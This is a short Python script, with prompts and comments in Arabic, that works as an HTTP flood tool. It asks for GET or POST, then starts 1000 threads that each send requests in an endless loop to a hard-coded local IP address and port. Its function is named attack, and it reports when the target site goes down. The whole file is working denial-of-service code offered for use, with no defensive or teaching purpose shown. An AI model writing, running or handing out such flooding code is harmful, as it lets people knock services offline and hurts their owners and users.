import threading
import requests

url = "http://192.168.0.171:8080"
method = input("GET أو POST؟ ").strip().upper()

def attack():
    while True:
        try:
            if method == "POST":
                res = requests.post(url, data={"key": "value"})
            else:
                res = requests.get(url)
            print("Status:", res.status_code)
        except:
            print("Error or site is down")

# عدد الخيوط
for i in range(1000):
    threading.Thread(target=attack).start()
